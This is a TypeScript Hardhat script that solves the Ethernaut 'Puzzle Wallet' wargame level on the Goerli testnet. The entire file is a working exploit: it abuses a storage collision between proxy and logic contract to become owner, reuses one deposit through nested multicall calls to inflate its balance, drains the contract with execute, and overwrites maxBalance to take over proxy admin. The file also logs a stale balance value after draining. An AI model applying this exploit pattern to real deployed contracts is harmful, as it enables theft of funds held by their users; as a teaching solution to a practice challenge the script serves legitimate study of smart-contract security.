import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackPuzzleWallet = async () => {
    // change contract addresses here.
    const puzzleWalletAddress = "0x383e5cdD8324Bb0E1DA147b2fD869e1cfA930887"; //type "await contract.address()" in ethernaut console
    const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";

    // Don't touch below
    // The vulnerability here arises due to storage collision between the proxy contract (PuzzleProxy) and logic contract (PuzzleWallet)
    // You may read more on:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // https://blog.openzeppelin.com/proxy-patterns/
    // sample table below to compare storage
    // slot | PuzzleWallet  -  PuzzleProxy
    // ----------------------------------
    //  0   |   owner      <-  pendingAdmin
    //  1   |   maxBalance <-  admin
    //  2   |           .
    //  3   |           .

    // 1. Make player the owner
    // check owner
    const contractPuzzleWallet = await ethers.getContractAt("PuzzleWallet", puzzleWalletAddress);
    const owner = (await contractPuzzleWallet.owner()).toString();
    console.log(`Initial owner is ${owner}`);
    console.log("Hacking storage to make player as owner...");
    const provider = await ethers.getDefaultProvider("goerli");
    /*Private Keys in .env file or hardcode here*/
    const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
    const wallet = new Wallet(PRIVATE_KEY, provider);
    const params = playerAddress;
    const funcSign = ["function proposeNewAdmin(address _newAdmin) external"];
    const iface = new ethers.utils.Interface(funcSign);
    const data = iface.encodeFunctionData("proposeNewAdmin", [params]);
    const tx1 = await wallet.sendTransaction({
        from: playerAddress,
        to: puzzleWalletAddress,
        data: data,
    });
    const txReceipt1 = await tx1.wait(1);
    console.log(txReceipt1);
    const newOwner = (await contractPuzzleWallet.owner()).toString();
    console.log(`Now owner is ${newOwner}...should be ${playerAddress} if success`);
    // 2. player adds himself to whitelist so that player can call onlyWhitelisted() guarded methods.
    console.log("Now adding player address to whitelist...");
    const tx2 = await contractPuzzleWallet.addToWhitelist(playerAddress);
    const txReceipt2 = await tx2.wait();
    console.log(txReceipt2);
    console.log("Player addded to whitelist...");
    // 3. alter maxBalance to add admin via setMaxbalance()
    // get balance of puzzle contract
    const puzzleWalletBalance = ethers.utils.formatEther(
        await provider.getBalance(puzzleWalletAddress)
    );
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance}`);
    console.log("Now changing balance mechanism via multicall...");
    // setMaxBalance can only set new maxBalance only if the contract's balance is 0.
    // crack the contract's accounting mechanism so that we can withdraw more than deposited and hence drain contract's balance.
    // can be done via multicall below
    const depositData = contractPuzzleWallet.interface.encodeFunctionData("deposit");
    const multicallData = contractPuzzleWallet.interface.encodeFunctionData("multicall", [
        [depositData],
    ]);
    const tx3 = await contractPuzzleWallet.multicall([depositData, multicallData], {
        value: ethers.utils.parseEther("0.001"),
    });
    const txReceipt3 = await tx3.wait();
    console.log(txReceipt3);
    console.log("Multicall done...and is now ready for draining balance...");
    // check balance after here
    // 4. execute() to drain contract balance
    console.log("Now draining contract via execute");
    const tx4 = await contractPuzzleWallet.execute(
        playerAddress,
        ethers.utils.parseEther("0.002"),
        "0x"
    );
    const txReceipt4 = await tx4.wait();
    console.log(txReceipt4);
    // puzzlew wallet balance should be 0
    console.log(`Puzzzle Wallet balance is: ${puzzleWalletBalance} (Should be 0 here)`);
    // 5. From here we can setmaxbalance() to change admin to player
    const tx5 = await contractPuzzleWallet.setMaxBalance(playerAddress);
    const txReceipt5 = await tx5.wait();
    console.log(txReceipt5);
    console.log("setmaxbalance to change player as admin done...checking...");
    const contractPuzzleProxy = await ethers.getContractAt("PuzzleProxy", puzzleWalletAddress);
    const admin = await contractPuzzleProxy.admin();
    console.log(`Puzzzle Proxy Admin is: ${admin} (Should be ${playerAddress})`);
};

attackPuzzleWallet()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
